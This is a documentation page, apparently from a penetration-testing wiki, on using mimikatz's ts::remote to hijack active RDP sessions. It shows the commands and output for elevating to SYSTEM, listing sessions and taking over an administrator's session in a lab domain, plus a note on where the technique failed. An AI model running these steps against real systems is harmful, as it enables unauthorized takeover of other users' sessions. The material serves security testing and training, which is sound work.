# remote

`ts::remote` can be used to perform RDP takeover/hijacking of active sessions. It has the following arguments:

* `/id`: The active RDP session id to hijack. It can be found with [`ts::sessions`](sessions.md).
* `/target`: It connects another session to the target ID, not your own/current session.
* `/password`: The password of the target RDP user. It is not required when running as `NT AUTHORITY\SYSTEM`.

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

640     {0;000003e7} 0 D 35719          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;01b55626} 2 F 30415201    hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730
(15g,26p)       Primary
 * Thread Token  : {0;000003e7} 0 D 30503948    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

```
mimikatz # ts::sessions

Session: 1 - RDP-Tcp#0
  state: Active (0)
  user : Administrator @ hacklab
  Conn : 9/25/2021 2:09:14 AM
  disc : 9/25/2021 2:09:13 AM
  logon: 9/25/2021 12:35:03 AM
  last : 9/25/2021 6:45:06 AM
  curr : 9/25/2021 6:48:11 AM
  lock : no
  addr4: 192.168.0.92

Session: *2 - RDP-Tcp#2
  state: Active (0)
  user : m3g9tr0n @ hacklab
  Conn : 9/25/2021 6:42:13 AM
  logon: 9/25/2021 6:42:15 AM
  last : 9/25/2021 6:48:11 AM
  curr : 9/25/2021 6:48:11 AM
  lock : no
  addr4: 192.168.0.92
```

```
mimikatz # ts::remote /id:1
Asking to connect from 3 to current session

> Connected to 1
```

{% hint style="warning" %}
Experiments showed the `ts::remote`, even running as `SYSTEM`, was not working against _Windows Server 2019 Standard 1809, OS Build 17763.737_. The password of the user to takeover was requested.
{% endhint %}

_(Demonstration target is a Windows Server 2016 Essentials)_
